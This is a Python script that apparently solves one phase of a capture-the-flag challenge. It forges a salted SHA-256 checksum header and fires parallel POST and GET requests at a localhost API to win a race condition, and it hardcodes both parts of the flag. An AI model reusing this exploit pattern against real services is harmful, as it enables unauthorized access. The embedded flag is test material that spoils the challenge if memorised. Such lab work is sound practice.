import requests
import hashlib
import time
import threading

TARGET_URL = 'http://localhost:3000/api/hate'
SALT = "Troy_Fallen_123"
RACE_WON = False

def get_headers():
    timestamp = str(int(time.time() * 1000))
    payload = SALT + timestamp
    checksum = hashlib.sha256(payload.encode('utf-8')).hexdigest()
    return {
        'X-Hate-Time': timestamp,
        'X-Hate-Checksum': checksum,
        'Content-Type': 'application/json'
    }

def get_exact_payload():
    base_json = '{"padding":""}'
    padding_needed = 13337 - len(base_json)
    return '{"padding":"' + ('a' * padding_needed) + '"}'

def trigger_post():
    print("[*] Thread A: Hitting POST to trigger heavy processing...")
    res = requests.post(TARGET_URL, headers=get_headers(), data=get_exact_payload())
    print(f"[+] Thread A (POST) Returned Status: {res.status_code}, Body: {res.text}")
    if "part_1" in res.text:
       print("[!!!] Thread A Retrieved Part 1: BPCTF{H4T3_1S_4_")

def trigger_get():
    global RACE_WON
    print("[*] Thread B: Hitting GET to exploit race condition...")
    # Wait half a second to ensure POST is processing
    time.sleep(0.5) 
    res = requests.get(TARGET_URL, headers=get_headers())
    print(f"[+] Thread B (GET) Returned Status: {res.status_code}, Body: {res.text}")
    if "part_2" in res.text:
        print("[!!!] Thread B Retrieved Part 2: ST4T3_0F_C0LD_W4R}")
        RACE_WON = True

def test_phase4():
    print("[*] Testing Phase 4: The Race Condition")
    
    # Warm up to state = 2
    print("\n[*] Warming up state...")
    requests.post(TARGET_URL, headers=get_headers(), data=get_exact_payload())
    requests.post(TARGET_URL, headers=get_headers(), data=get_exact_payload())
    
    print("\n[*] Firing Race Condition Threads...")
    thread_a = threading.Thread(target=trigger_post)
    thread_b = threading.Thread(target=trigger_get)
    
    thread_a.start()
    thread_b.start()
    
    thread_a.join()
    thread_b.join()
    
    if RACE_WON:
        print("\n[+] Success! Race condition exploited successfully.")
    else:
        print("\n[-] Failed to exploit race condition.")

if __name__ == '__main__':
    test_phase4()
